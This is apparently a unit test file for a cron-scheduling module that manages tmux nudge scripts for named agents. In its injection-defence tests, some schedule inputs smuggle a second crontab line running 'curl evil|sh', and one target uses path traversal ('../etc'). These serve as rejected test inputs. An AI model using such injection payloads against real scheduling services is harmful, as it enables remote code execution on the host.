/**
 * test/cron.server.test.ts - Unit tests for app/lib/cron.server.ts (TASK-460).
 *
 * ALL crontab interactions are STUBBED. The real user crontab is NEVER touched.
 * The CronDeps injection interface exists precisely for this suite.
 *
 * Covers:
 *   - buildNudgeScript: paste-delivery shape (load-buffer, paste-buffer, PROMPT_FILE).
 *   - RMW dedup-guard: createCron skips if same schedule+script already present.
 *   - Tag-scoping: untagged crontab lines (mem-monitor etc.) are never modified.
 *   - Target-validation rejection: unknown target returns { ok: false }.
 *   - Agent-mode: writes prompt file + script; message accepted with markdown chars.
 *   - Script-mode: writes script body directly; no prompt file; crontab runs directly.
 *   - listCrons: reads prompt file (agent) or script body (script-mode); targetType.
 *   - deleteCron: cleans up both .sh and .prompt.md files.
 *   - Disable/enable round-trip: setEnabled toggles the comment prefix and tag.
 *
 * ASCII only - no em-dashes (FND-05).
 */

import { describe, it, expect, vi } from "vitest";
import {
  listCrons,
  createCron,
  updateCron,
  setEnabled,
  deleteCron,
  buildNudgeScript,
  type CronDeps,
} from "~/lib/cron.server";

// ---------------------------------------------------------------------------
// Stub builder
// ---------------------------------------------------------------------------

function makeDeps(
  initialLines: string[] = [],
  overrides: Partial<CronDeps> = {}
): CronDeps & { lines: string[]; written: string[] } {
  const lines = [...initialLines];
  const written: string[] = [];

  return {
    lines,
    written,
    readCrontab: () => lines.join("\n"),
    writeCrontab: (content: string) => {
      lines.length = 0;
      lines.push(...content.split("\n"));
      written.push(content);
    },
    writeScript: vi.fn(),
    deleteScript: vi.fn(),
    listAgentDirs: () => ["quill", "sprout", "fern", "atlas", "briar"],
    readStateFile: () => null,
    writeStateFile: vi.fn(),
    homedir: () => "/home/you",
    ...overrides,
  };
}

// ---------------------------------------------------------------------------
// buildNudgeScript - paste-delivery shape (ask-1)
// ---------------------------------------------------------------------------

describe("buildNudgeScript template structure", () => {
  it("starts with shebang and set -u", () => {
    const script = buildNudgeScript("sprout", "abc123", "/home/you/agents/sprout/bin/cron-nudge-abc123.prompt.md");
    expect(script.startsWith("#!/usr/bin/env bash")).toBe(true);
    expect(script).toContain("set -u");
  });

  it("embeds the target and id in paths", () => {
    const script = buildNudgeScript("sprout", "xyz", "/home/you/agents/sprout/bin/cron-nudge-xyz.prompt.md");
    expect(script).toContain(".the-vault/agents/sprout/cron-state");
    expect(script).toContain("xyz");
  });

  it("includes has-session guard", () => {
    const script = buildNudgeScript("quill", "myid", "/some/prompt.md");
    expect(script).toContain("has-session");
    expect(script).toContain("|| exit 0");
  });

  it("includes PROMPT_FILE variable referencing the given path", () => {
    const promptPath = "/home/you/agents/sprout/bin/cron-nudge-abc.prompt.md";
    const script = buildNudgeScript("sprout", "abc", promptPath);
    expect(script).toContain(`PROMPT_FILE="${promptPath}"`);
  });

  it("includes tmux load-buffer with named buffer", () => {
    const script = buildNudgeScript("quill", "myid", "/some/prompt.md");
    expect(script).toContain("tmux load-buffer");
    expect(script).toContain("cron-myid");
  });

  it("includes tmux paste-buffer with -p flag (bracketed-paste)", () => {
    const script = buildNudgeScript("quill", "myid", "/some/prompt.md");
    expect(script).toContain("tmux paste-buffer -p");
  });

  it("does NOT contain the message content (message is in the prompt file, not embedded)", () => {
    const secret = "super secret markdown content with `backticks` and $vars";
    const script = buildNudgeScript("sprout", "abc", "/home/you/agents/sprout/bin/cron-nudge-abc.prompt.md");
    // The message is NOT in the script; only the file path is.
    expect(script).not.toContain(secret);
  });

  it("includes send-keys with double-Enter race defeat", () => {
    const script = buildNudgeScript("quill", "myid", "/some/prompt.md");
    // Two Enter send-keys for the double-Enter race defeat
    const enterCount = (script.match(/send-keys.*Enter/g) ?? []).length;
    expect(enterCount).toBeGreaterThanOrEqual(2);
  });

  it("includes per-run marker (idempotent guard)", () => {
    const script = buildNudgeScript("sprout", "abc", "/some/prompt.md");
    expect(script).toContain("MARKER=");
    expect(script).toContain("exit 0");
  });

  it("uses per-minute marker (date +%F-%H%M) not per-day (date +%F)", () => {
    const script = buildNudgeScript("sprout", "abc", "/some/prompt.md");
    expect(script).toContain("$(date +%F-%H%M)");
    expect(script).not.toContain("$(date +%F)");
  });

  it("includes cleanup find command to delete stale markers for this id", () => {
    const script = buildNudgeScript("sprout", "abc", "/some/prompt.md");
    expect(script).toContain("find \"$CRON_STATE_DIR\"");
    expect(script).toContain(".run-marker-abc-*");
    expect(script).toContain("-delete");
  });

  it("includes DC4 state-file writes (fired + delivered)", () => {
    const script = buildNudgeScript("sprout", "abc", "/some/prompt.md");
    expect(script).toContain("STATE_FILE=");
    expect(script).toContain("fired");
    expect(script).toContain("delivered");
  });
});

// ---------------------------------------------------------------------------
// createCron - schedule injection defence (SECURITY)
// ---------------------------------------------------------------------------

describe("createCron - schedule injection defence", () => {
  it("rejects a schedule containing a newline (crontab injection payload)", () => {
    const deps = makeDeps();
    // The injection payload: the first line is valid cron, the second is the
    // injected arbitrary command. A vulnerable createCron would write BOTH
    // lines into the crontab, scheduling curl on a real system.
    const injectedSchedule = "* * * * *\n* * * * * curl evil|sh # MC-CRON:x";
    const result = createCron(
      { schedule: injectedSchedule, target: "sprout", message: "legit", enabled: true },
      deps
    );
    expect(result.ok).toBe(false);
    // Must NOT have written to the crontab.
    expect(deps.written).toHaveLength(0);
    expect(deps.writeScript).not.toHaveBeenCalled();
  });

  it("rejects a schedule containing a carriage return (\\r injection)", () => {
    const deps = makeDeps();
    const result = createCron(
      { schedule: "30 7 * * *\r* * * * * curl evil|sh", target: "sprout", message: "legit", enabled: true },
      deps
    );
    expect(result.ok).toBe(false);
    expect(deps.written).toHaveLength(0);
    expect(deps.writeScript).not.toHaveBeenCalled();
  });

  it("accepts the 1-minute floor (* * * * *) on the create path", () => {
    const deps = makeDeps();
    const result = createCron(
      { schedule: "* * * * *", target: "sprout", message: "ping", enabled: true },
      deps
    );
    expect(result.ok).toBe(true);
  });

  it("rejects a malformed cron expression (4 fields)", () => {
    const deps = makeDeps();
    const result = createCron(
      { schedule: "* * * *", target: "sprout", message: "ping", enabled: true },
      deps
    );
    expect(result.ok).toBe(false);
    expect(deps.written).toHaveLength(0);
  });
});

// ---------------------------------------------------------------------------
// createCron - agent mode (ask-1)
// ---------------------------------------------------------------------------

describe("createCron - agent mode", () => {
  it("appends a tagged line to the crontab", () => {
    const deps = makeDeps();
    const result = createCron(
      { schedule: "30 7 * * *", target: "sprout", message: "morning", enabled: true },
      deps
    );
    expect(result.ok).toBe(true);
    if (!result.ok) return;
    const content = deps.lines.join("\n");
    expect(content).toContain("30 7 * * *");
    expect(content).toContain("# MC-CRON:");
    expect(content).toContain(result.id);
  });

  it("writes TWO files: the prompt (.prompt.md) and the script (.sh)", () => {
    const deps = makeDeps();
    const result = createCron(
      { schedule: "0 9 * * *", target: "quill", message: "ping", enabled: true },
      deps
    );
    expect(result.ok).toBe(true);
    expect(deps.writeScript).toHaveBeenCalledTimes(2);
    const calls = (deps.writeScript as ReturnType<typeof vi.fn>).mock.calls as [string, string, number | undefined][];
    const promptCall = calls.find(([p]) => p.endsWith(".prompt.md"));
    const scriptCall = calls.find(([p]) => p.endsWith(".sh"));
    expect(promptCall).toBeDefined();
    expect(scriptCall).toBeDefined();
    // Prompt file contains the message
    expect(promptCall![1]).toBe("ping");
    // Script file contains the bash shebang (generated by buildNudgeScript)
    expect(scriptCall![1]).toContain("#!/usr/bin/env bash");
    // Script references the prompt file path
    expect(scriptCall![1]).toContain(promptCall![0]);
  });

  it("writes .prompt.md with mode 0o644 (data) and .sh with mode 0o755 (executable)", () => {
    const deps = makeDeps();
    const result = createCron(
      { schedule: "0 8 * * *", target: "sprout", message: "morning nudge", enabled: true },
      deps
    );
    expect(result.ok).toBe(true);
    const calls = (deps.writeScript as ReturnType<typeof vi.fn>).mock.calls as [string, string, number | undefined][];
    const promptCall = calls.find(([p]) => p.endsWith(".prompt.md"));
    const scriptCall = calls.find(([p]) => p.endsWith(".sh"));
    expect(promptCall).toBeDefined();
    expect(scriptCall).toBeDefined();
    // .prompt.md is data -- must NOT be executable
    expect(promptCall![2]).toBe(0o644);
    // .sh is the nudge script -- must remain executable
    expect(scriptCall![2]).toBeUndefined(); // default 0o755 (no explicit mode passed)
  });

  it("accepts markdown message with backticks, dollar, newlines (ask-1 ACCEPTANCE)", () => {
    const deps = makeDeps();
    const msg = "## Morning\n\nRun `pnpm build`. Check `$HOME/agents`.";
    const result = createCron(
      { schedule: "30 7 * * *", target: "sprout", message: msg, enabled: true },
      deps
    );
    expect(result.ok).toBe(true);
  });

  it("accepts double-quote in agent message", () => {
    const deps = makeDeps();
    const result = createCron(
      { schedule: "30 7 * * *", target: "sprout", message: 'say "hello"', enabled: true },
      deps
    );
    expect(result.ok).toBe(true);
  });

  it("accepts semicolon in agent message", () => {
    const deps = makeDeps();
    const result = createCron(
      { schedule: "30 7 * * *", target: "sprout", message: "foo; check status", enabled: true },
      deps
    );
    expect(result.ok).toBe(true);
  });

  it("accepts pipe in agent message", () => {
    const deps = makeDeps();
    const result = createCron(
      { schedule: "30 7 * * *", target: "sprout", message: "cmd | tee output", enabled: true },
      deps
    );
    expect(result.ok).toBe(true);
  });

  it("accepts ampersand in agent message", () => {
    const deps = makeDeps();
    const result = createCron(
      { schedule: "30 7 * * *", target: "sprout", message: "foo & bar", enabled: true },
      deps
    );
    expect(result.ok).toBe(true);
  });

  it("accepts angle brackets in agent message", () => {
    const deps = makeDeps();
    const resultLt = createCron(
      { schedule: "30 7 * * *", target: "sprout", message: "less < than", enabled: true },
      deps
    );
    expect(resultLt.ok).toBe(true);
    const deps2 = makeDeps();
    const resultGt = createCron(
      { schedule: "30 7 * * *", target: "sprout", message: "greater > than", enabled: true },
      deps2
    );
    expect(resultGt.ok).toBe(true);
  });

  it("accepts backtick in agent message", () => {
    const deps = makeDeps();
    const result = createCron(
      { schedule: "30 7 * * *", target: "sprout", message: "wake `date`", enabled: true },
      deps
    );
    expect(result.ok).toBe(true);
  });

  it("accepts dollar sign in agent message", () => {
    const deps = makeDeps();
    const result = createCron(
      { schedule: "30 7 * * *", target: "sprout", message: "cost is $100", enabled: true },
      deps
    );
    expect(result.ok).toBe(true);
  });

  it("accepts backslash in agent message", () => {
    const deps = makeDeps();
    const result = createCron(
      { schedule: "30 7 * * *", target: "sprout", message: "path\\file", enabled: true },
      deps
    );
    expect(result.ok).toBe(true);
  });

  it("accepts newline in agent message (multi-line prompt)", () => {
    const deps = makeDeps();
    const result = createCron(
      { schedule: "30 7 * * *", target: "sprout", message: "line1\nline2", enabled: true },
      deps
    );
    expect(result.ok).toBe(true);
  });

  it("accepts a typical cron nudge message (comma, colon, space)", () => {
    const deps = makeDeps();
    const result = createCron(
      { schedule: "30 7 * * *", target: "sprout", message: "07:33 check-in, generate dashboard", enabled: true },
      deps
    );
    expect(result.ok).toBe(true);
  });

  it("accepts a normal plain-text message", () => {
    const deps = makeDeps();
    const result = createCron(
      { schedule: "30 7 * * *", target: "sprout", message: "morning check-in: are you ready?", enabled: true },
      deps
    );
    expect(result.ok).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// createCron - script mode (ask-3)
// ---------------------------------------------------------------------------

describe("createCron - script mode", () => {
  it("writes ONE file: the script body (no prompt file)", () => {
    const scriptBody = "#!/usr/bin/env bash\npnpm --dir ~/projects/the-vault run some-task";
    const deps = makeDeps();
    const result = createCron(
      {
        schedule: "*/30 * * * *",
        target: "quill",
        message: scriptBody,
        enabled: true,
        targetType: "script",
      },
      deps
    );
    expect(result.ok).toBe(true);
    expect(deps.writeScript).toHaveBeenCalledTimes(1);
    const calls = (deps.writeScript as ReturnType<typeof vi.fn>).mock.calls as [string, string, number | undefined][];
    const scriptCall = calls[0]!;
    // Script path ends with .sh
    expect(scriptCall[0]).toMatch(/\.sh$/);
    // Content is the raw body (not a buildNudgeScript wrapper)
    expect(scriptCall[1]).toBe(scriptBody);
    // No .prompt.md file written
    expect(calls.some(([p]) => p.endsWith(".prompt.md"))).toBe(false);
  });

  it("crontab line for script mode runs the script directly (same format as agent mode)", () => {
    const deps = makeDeps();
    const result = createCron(
      {
        schedule: "*/10 * * * *",
        target: "quill",
        message: "#!/usr/bin/env bash\necho hello",
        enabled: true,
        targetType: "script",
      },
      deps
    );
    expect(result.ok).toBe(true);
    if (!result.ok) return;
    const content = deps.lines.join("\n");
    // Active script-mode line: <schedule> <scriptPath> # MC-CRON:<id>
    expect(content).toContain("*/10 * * * *");
    expect(content).toContain(`# MC-CRON:${result.id}`);
    // The script path goes directly in the crontab (no tmux indirection)
    expect(content).toContain(result.scriptPath);
  });

  it("accepts arbitrary shell content in script body (no SHELL_UNSAFE_RE)", () => {
    const body = '#!/usr/bin/env bash\necho "$HOME" | tee /tmp/out; curl "http://example.com"';
    const deps = makeDeps();
    const result = createCron(
      {
        schedule: "*/30 * * * *",
        target: "atlas",
        message: body,
        enabled: true,
        targetType: "script",
      },
      deps
    );
    expect(result.ok).toBe(true);
  });

  it("target validation still applies in script mode", () => {
    const deps = makeDeps();
    const result = createCron(
      {
        schedule: "30 7 * * *",
        target: "nonexistent-agent",
        message: "#!/usr/bin/env bash\necho hi",
        enabled: true,
        targetType: "script",
      },
      deps
    );
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.error).toContain("Unknown target agent");
    expect(deps.writeScript).not.toHaveBeenCalled();
  });

  it("creates a disabled script-mode entry when enabled=false", () => {
    const deps = makeDeps();
    const result = createCron(
      {
        schedule: "0 9 * * *",
        target: "quill",
        message: "#!/usr/bin/env bash\necho hi",
        enabled: false,
        targetType: "script",
      },
      deps
    );
    expect(result.ok).toBe(true);
    const content = deps.lines.join("\n");
    const managed = content.split("\n").filter((l) => l.includes("MC-CRON"));
    expect(managed[0]).toMatch(/^#/);
    expect(managed[0]).toContain("MC-CRON-DISABLED");
  });
});

// ---------------------------------------------------------------------------
// target validation (common)
// ---------------------------------------------------------------------------

describe("createCron - target validation", () => {
  it("rejects unknown agent", () => {
    const deps = makeDeps();
    const result = createCron(
      { schedule: "30 7 * * *", target: "unknown-agent", message: "hi", enabled: true },
      deps
    );
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.error).toContain("Unknown target agent");
    expect(deps.written).toHaveLength(0);
  });

  it("rejects path-traversal shaped names", () => {
    const deps = makeDeps([], {
      listAgentDirs: () => ["quill", "sprout"],
    });
    const result = createCron(
      { schedule: "30 7 * * *", target: "../etc", message: "hi", enabled: true },
      deps
    );
    expect(result.ok).toBe(false);
  });

  it("dedup-guard - fires when the same schedule+target combination already exists", () => {
    const deps = makeDeps();
    const first = createCron(
      { schedule: "30 7 * * *", target: "sprout", message: "first", enabled: true },
      deps
    );
    expect(first.ok).toBe(true);

    const second = createCron(
      { schedule: "30 7 * * *", target: "sprout", message: "dup", enabled: true },
      deps
    );
    expect(second.ok).toBe(false);
    if (!second.ok) expect(second.error).toContain("already exists");
  });

  it("dedup-guard - allows same schedule for different agents", () => {
    const deps = makeDeps();
    const first = createCron(
      { schedule: "30 7 * * *", target: "sprout", message: "sprout morning", enabled: true },
      deps
    );
    expect(first.ok).toBe(true);

    const second = createCron(
      { schedule: "30 7 * * *", target: "quill", message: "quill morning", enabled: true },
      deps
    );
    expect(second.ok).toBe(true);

    const crons = listCrons(deps);
    expect(crons.filter((c) => c.schedule === "30 7 * * *").length).toBe(2);
  });

  it("trailing blank lines do not accumulate on repeated creates", () => {
    const deps = makeDeps(["30 7 * * * /home/you/agents/quill/bin/cron-nudge-old.sh # MC-CRON:old", ""]);
    deps.listAgentDirs = () => ["sprout", "quill"];

    const result = createCron(
      { schedule: "0 9 * * *", target: "sprout", message: "morning", enabled: true },
      deps
    );
    expect(result.ok).toBe(true);

    const content = deps.written[0]!;
    expect(content).not.toMatch(/\n\n/);
    expect(content.endsWith("\n")).toBe(true);
    expect(content.endsWith("\n\n")).toBe(false);
  });

  it("creates a disabled entry (commented line) when enabled=false", () => {
    const deps = makeDeps();
    const result = createCron(
      { schedule: "0 9 * * *", target: "quill", message: "ping", enabled: false },
      deps
    );
    expect(result.ok).toBe(true);
    const content = deps.lines.join("\n");
    const managed = content
      .split("\n")
      .filter((l) => l.includes("MC-CRON"));
    expect(managed.length).toBeGreaterThanOrEqual(1);
    expect(managed[0]).toMatch(/^#/);
    expect(managed[0]).toContain("MC-CRON-DISABLED");
  });
});

// ---------------------------------------------------------------------------
// listCrons - body recovery (ask-1 + ask-3)
// ---------------------------------------------------------------------------

describe("listCrons - body/targetType detection", () => {
  it("returns targetType=agent and prompt text when .prompt.md sibling exists", () => {
    const promptContent = "## Morning\n\nRun `pnpm build`.";
    const deps = makeDeps(
      ["30 7 * * * /home/you/agents/sprout/bin/cron-nudge-abc.sh # MC-CRON:abc"],
      {
        readStateFile: (filePath: string) => {
          if (filePath.endsWith(".prompt.md")) return promptContent;
          return null;
        },
      }
    );

    const crons = listCrons(deps);
    expect(crons).toHaveLength(1);
    expect(crons[0]!.targetType).toBe("agent");
    expect(crons[0]!.message).toBe(promptContent);
  });

  it("returns targetType=script and script body when no .prompt.md sibling", () => {
    const scriptBody = "#!/usr/bin/env bash\necho hello";
    const deps = makeDeps(
      ["*/10 * * * * /home/you/agents/quill/bin/cron-nudge-xyz.sh # MC-CRON:xyz"],
      {
        readStateFile: (filePath: string) => {
          if (filePath.endsWith(".sh")) return scriptBody;
          return null; // no .prompt.md
        },
      }
    );

    const crons = listCrons(deps);
    expect(crons).toHaveLength(1);
    expect(crons[0]!.targetType).toBe("script");
    expect(crons[0]!.message).toBe(scriptBody);
  });

  it("returns message='' for legacy entries with no .prompt.md and no script content", () => {
    const deps = makeDeps(
      ["30 7 * * * /home/you/agents/sprout/bin/cron-nudge-old.sh # MC-CRON:old"],
      {
        readStateFile: () => null,
      }
    );

    const crons = listCrons(deps);
    expect(crons).toHaveLength(1);
    expect(crons[0]!.message).toBe("");
    // Legacy crons default to script targetType when no prompt file
    expect(crons[0]!.targetType).toBe("script");
  });

  it("parses active managed lines", () => {
    const deps = makeDeps([
      "30 7 * * * /home/you/agents/sprout/bin/cron-nudge-abc.sh # MC-CRON:abc",
    ]);

    const crons = listCrons(deps);
    expect(crons).toHaveLength(1);
    expect(crons[0]!.id).toBe("abc");
    expect(crons[0]!.schedule).toBe("30 7 * * *");
    expect(crons[0]!.enabled).toBe(true);
    expect(crons[0]!.target).toBe("sprout");
  });

  it("parses disabled managed lines", () => {
    const deps = makeDeps([
      "# 0 9 * * * /home/you/agents/quill/bin/cron-nudge-dis.sh # MC-CRON-DISABLED:dis",
    ]);

    const crons = listCrons(deps);
    expect(crons).toHaveLength(1);
    expect(crons[0]!.id).toBe("dis");
    expect(crons[0]!.enabled).toBe(false);
    expect(crons[0]!.target).toBe("quill");
  });

  it("ignores untagged lines", () => {
    const deps = makeDeps([
      "*/3 * * * * /home/you/agents/mem-monitor.sh",
      "0 0 * * 0 /usr/local/bin/backup.sh",
      "30 7 * * * /home/you/agents/sprout/bin/cron-nudge-abc.sh # MC-CRON:abc",
    ]);

    const crons = listCrons(deps);
    expect(crons).toHaveLength(1);
    expect(crons[0]!.id).toBe("abc");
  });

  it("reads lastFired/lastDelivered from state file", () => {
    const stateJson = JSON.stringify({
      fired: "2026-06-16T07:30:00Z",
      delivered: "2026-06-16T07:30:02Z",
    });
    const deps = makeDeps(
      ["30 7 * * * /home/you/agents/sprout/bin/cron-nudge-st.sh # MC-CRON:st"],
      {
        readStateFile: (filePath: string) => {
          if (filePath.endsWith(".json")) return stateJson;
          return null;
        },
      }
    );

    const crons = listCrons(deps);
    expect(crons[0]!.lastFired).toBe("2026-06-16T07:30:00Z");
    expect(crons[0]!.lastDelivered).toBe("2026-06-16T07:30:02Z");
  });

  it("returns null lastFired/lastDelivered when state file missing", () => {
    const deps = makeDeps([
      "30 7 * * * /home/you/agents/sprout/bin/cron-nudge-ns.sh # MC-CRON:ns",
    ]);

    const crons = listCrons(deps);
    expect(crons[0]!.lastFired).toBeNull();
    expect(crons[0]!.lastDelivered).toBeNull();
  });

  it("returns empty array when crontab is empty", () => {
    const deps = makeDeps([]);
    expect(listCrons(deps)).toHaveLength(0);
  });
});

// ---------------------------------------------------------------------------
// Tag-scoping: untagged lines never touched
// ---------------------------------------------------------------------------

describe("tag-scoping: untagged lines are never modified", () => {
  const memMonitorLine =
    "*/3 * * * * /home/you/agents/mem-monitor.sh >> /home/you/agents/mem-monitor.log 2>&1";
  const handAddedLine = "0 0 * * 0 /usr/local/bin/weekly-backup.sh";

  it("deleteCron leaves untagged lines intact", () => {
    const deps = makeDeps([
      memMonitorLine,
      handAddedLine,
      "30 7 * * * /home/you/agents/sprout/bin/cron-nudge-abc.sh # MC-CRON:abc",
    ]);
    deps.listAgentDirs = () => ["sprout"];

    const result = deleteCron("abc", deps);
    expect(result.ok).toBe(true);

    const surviving = deps.lines.join("\n");
    expect(surviving).toContain(memMonitorLine);
    expect(surviving).toContain(handAddedLine);
    expect(surviving).not.toContain("MC-CRON:abc");
  });

  it("setEnabled leaves untagged lines intact", () => {
    const deps = makeDeps([
      memMonitorLine,
      "30 7 * * * /home/you/agents/sprout/bin/cron-nudge-abc.sh # MC-CRON:abc",
      handAddedLine,
    ]);

    const result = setEnabled("abc", false, deps);
    expect(result.ok).toBe(true);

    const surviving = deps.lines.join("\n");
    expect(surviving).toContain(memMonitorLine);
    expect(surviving).toContain(handAddedLine);
  });

  it("createCron does not alter existing untagged lines", () => {
    const deps = makeDeps([memMonitorLine, handAddedLine]);
    deps.listAgentDirs = () => ["quill"];

    createCron({ schedule: "0 8 * * *", target: "quill", message: "hi", enabled: true }, deps);

    const content = deps.lines.join("\n");
    expect(content).toContain(memMonitorLine);
    expect(content).toContain(handAddedLine);
  });
});

// ---------------------------------------------------------------------------
// deleteCron - file lifecycle (ask-1: cleans up both .sh and .prompt.md)
// ---------------------------------------------------------------------------

describe("deleteCron - file lifecycle", () => {
  it("removes the tagged line and calls deleteScript", () => {
    const deps = makeDeps([
      "30 7 * * * /home/you/agents/sprout/bin/cron-nudge-del.sh # MC-CRON:del",
    ]);

    const result = deleteCron("del", deps);
    expect(result.ok).toBe(true);
    const content = deps.lines.join("\n");
    expect(content).not.toContain("MC-CRON:del");
  });

  it("calls deleteScript for BOTH the .sh and the .prompt.md sibling", () => {
    const deps = makeDeps([
      "30 7 * * * /home/you/agents/sprout/bin/cron-nudge-del.sh # MC-CRON:del",
    ]);

    const result = deleteCron("del", deps);
    expect(result.ok).toBe(true);

    const deleteScriptMock = deps.deleteScript as ReturnType<typeof vi.fn>;
    const deletedPaths = deleteScriptMock.mock.calls.map((call) => call[0] as string);
    expect(deletedPaths.some((p: string) => p.endsWith(".sh"))).toBe(true);
    expect(deletedPaths.some((p: string) => p.endsWith(".prompt.md"))).toBe(true);
  });

  it("removes a disabled (commented) tagged line", () => {
    const deps = makeDeps([
      "# 0 9 * * * /home/you/agents/quill/bin/cron-nudge-ddis.sh # MC-CRON-DISABLED:ddis",
    ]);

    const result = deleteCron("ddis", deps);
    expect(result.ok).toBe(true);
    const content = deps.lines.join("\n");
    expect(content).not.toContain("ddis");
  });

  it("returns { ok: false } for unknown id", () => {
    const deps = makeDeps([
      "30 7 * * * /home/you/agents/sprout/bin/cron-nudge-abc.sh # MC-CRON:abc",
    ]);
    const result = deleteCron("unknown", deps);
    expect(result.ok).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// setEnabled - disable/enable round-trip
// ---------------------------------------------------------------------------

describe("setEnabled - disable/enable round-trip", () => {
  it("disabling a cron comments the line and flips to DISABLED tag", () => {
    const deps = makeDeps([
      "30 7 * * * /home/you/agents/sprout/bin/cron-nudge-myd.sh # MC-CRON:myd",
    ]);

    const result = setEnabled("myd", false, deps);
    expect(result.ok).toBe(true);

    const line = deps.lines.find((l) => l.includes("myd"));
    expect(line).toBeDefined();
    expect(line!.trimStart()).toMatch(/^#/);
    expect(line).toContain("MC-CRON-DISABLED:myd");
  });

  it("enabling a disabled cron uncomments the line and flips to active tag", () => {
    const deps = makeDeps([
      "# 30 7 * * * /home/you/agents/sprout/bin/cron-nudge-mye.sh # MC-CRON-DISABLED:mye",
    ]);

    const result = setEnabled("mye", true, deps);
    expect(result.ok).toBe(true);

    const line = deps.lines.find((l) => l.includes("mye") && l.trim() !== "");
    expect(line).toBeDefined();
    expect(line!.trimStart()).not.toMatch(/^#/);
    expect(line).toContain("MC-CRON:mye");
    expect(line).not.toContain("DISABLED");
  });

  it("round-trip: enable -> disable -> enable preserves schedule", () => {
    const schedule = "0 9 * * *";
    const deps = makeDeps([
      `${schedule} /home/you/agents/quill/bin/cron-nudge-rt.sh # MC-CRON:rt`,
    ]);

    expect(setEnabled("rt", false, deps).ok).toBe(true);
    expect(setEnabled("rt", true, deps).ok).toBe(true);

    const line = deps.lines.find((l) => l.includes("MC-CRON:rt"));
    expect(line).toBeDefined();
    expect(line).toContain(schedule);
    expect(line!.trimStart()).not.toMatch(/^#/);
  });

  it("strong round-trip: active->disabled->active has EXACTLY ONE tag each step (no double-tag bug)", () => {
    const id = "str";
    const script = "/home/you/agents/sprout/bin/cron-nudge-str.sh";
    const schedule = "30 7 * * *";
    const deps = makeDeps([`${schedule} ${script} # MC-CRON:${id}`]);

    // Step 1: disable
    expect(setEnabled(id, false, deps).ok).toBe(true);

    const disabledLine = deps.lines.find((l) => l.includes(id) && l.trim() !== "");
    expect(disabledLine).toBeDefined();
    expect(disabledLine!.trimStart()).toMatch(/^#/);
    const disabledTagCount = (disabledLine!.match(/MC-CRON-DISABLED:str/g) ?? []).length;
    const activeTagCount = (disabledLine!.match(/MC-CRON:str(?!D)/g) ?? []).length;
    expect(disabledTagCount).toBe(1);
    expect(activeTagCount).toBe(0);

    const cronsMid = listCrons(deps);
    const entryMid = cronsMid.find((c) => c.id === id);
    expect(entryMid).toBeDefined();
    expect(entryMid!.enabled).toBe(false);

    // Step 2: re-enable
    expect(setEnabled(id, true, deps).ok).toBe(true);

    const activeLine = deps.lines.find((l) => l.includes(id) && l.trim() !== "");
    expect(activeLine).toBeDefined();
    expect(activeLine!.trimStart()).not.toMatch(/^#/);
    const activeTagCount2 = (activeLine!.match(/MC-CRON:str(?!D)/g) ?? []).length;
    const disabledTagCount2 = (activeLine!.match(/MC-CRON-DISABLED:str/g) ?? []).length;
    expect(activeTagCount2).toBe(1);
    expect(disabledTagCount2).toBe(0);

    const cronsEnd = listCrons(deps);
    const entryEnd = cronsEnd.find((c) => c.id === id);
    expect(entryEnd).toBeDefined();
    expect(entryEnd!.enabled).toBe(true);
    expect(entryEnd!.schedule).toBe(schedule);
  });

  it("returns { ok: false } when the id is not found", () => {
    const deps = makeDeps([
      "30 7 * * * /home/you/agents/sprout/bin/cron-nudge-abc.sh # MC-CRON:abc",
    ]);
    const result = setEnabled("nonexistent", false, deps);
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error).toContain("nonexistent");
    }
  });
});

// ---------------------------------------------------------------------------
// updateCron - edit path enforces the SAME guards as create (SECURITY)
// ---------------------------------------------------------------------------

describe("updateCron - schedule + message injection defence (same guards as create)", () => {
  // An existing managed entry to edit in each test.
  const existingLine =
    "30 7 * * * /home/you/agents/sprout/bin/cron-nudge-edit.sh # MC-CRON:edit";

  it("REJECTS a schedule containing a newline (crontab injection on the UPDATE path)", () => {
    const deps = makeDeps([existingLine]);
    // The injection payload: a valid first line, then an injected command line.
    // An unvalidated updateCron would re-write BOTH lines into the crontab.
    const injectedSchedule = "* * * * *\n* * * * * curl evil|sh # MC-CRON:x";
    const result = updateCron(
      { id: "edit", schedule: injectedSchedule, target: "sprout", message: "legit", enabled: true },
      deps
    );
    expect(result.ok).toBe(false);
    // Must NOT have re-written the crontab and must NOT have written a script.
    expect(deps.written).toHaveLength(0);
    expect(deps.writeScript).not.toHaveBeenCalled();
  });

  it("REJECTS a schedule containing a carriage return (\\r injection) on the UPDATE path", () => {
    const deps = makeDeps([existingLine]);
    const result = updateCron(
      { id: "edit", schedule: "30 7 * * *\r* * * * * curl evil|sh", target: "sprout", message: "legit", enabled: true },
      deps
    );
    expect(result.ok).toBe(false);
    expect(deps.written).toHaveLength(0);
    expect(deps.writeScript).not.toHaveBeenCalled();
  });

  it("REJECTS an agent message containing a control char (NUL) on the UPDATE path", () => {
    const deps = makeDeps([existingLine]);
    // NUL byte in the prompt - rejected by TMUX_UNSAFE_CTRL_RE on create AND edit.
    const result = updateCron(
      { id: "edit", schedule: "0 9 * * *", target: "sprout", message: "hello\x00world", enabled: true },
      deps
    );
    expect(result.ok).toBe(false);
    expect(deps.written).toHaveLength(0);
    expect(deps.writeScript).not.toHaveBeenCalled();
  });

  it("REJECTS an agent message containing a carriage-return control char on the UPDATE path", () => {
    const deps = makeDeps([existingLine]);
    const result = updateCron(
      { id: "edit", schedule: "0 9 * * *", target: "sprout", message: "line1\rline2", enabled: true },
      deps
    );
    expect(result.ok).toBe(false);
    expect(deps.written).toHaveLength(0);
    expect(deps.writeScript).not.toHaveBeenCalled();
  });

  it("accepts the 1-minute floor (* * * * *) on the UPDATE path", () => {
    const deps = makeDeps([existingLine]);
    const result = updateCron(
      { id: "edit", schedule: "* * * * *", target: "sprout", message: "ping", enabled: true },
      deps
    );
    expect(result.ok).toBe(true);
  });

  it("REJECTS an unknown target agent on the UPDATE path", () => {
    const deps = makeDeps([existingLine]);
    const result = updateCron(
      { id: "edit", schedule: "0 9 * * *", target: "nonexistent-agent", message: "ping", enabled: true },
      deps
    );
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.error).toContain("Unknown target agent");
    expect(deps.written).toHaveLength(0);
    expect(deps.writeScript).not.toHaveBeenCalled();
  });
});

describe("updateCron - happy path (in-place re-write)", () => {
  const existingLine =
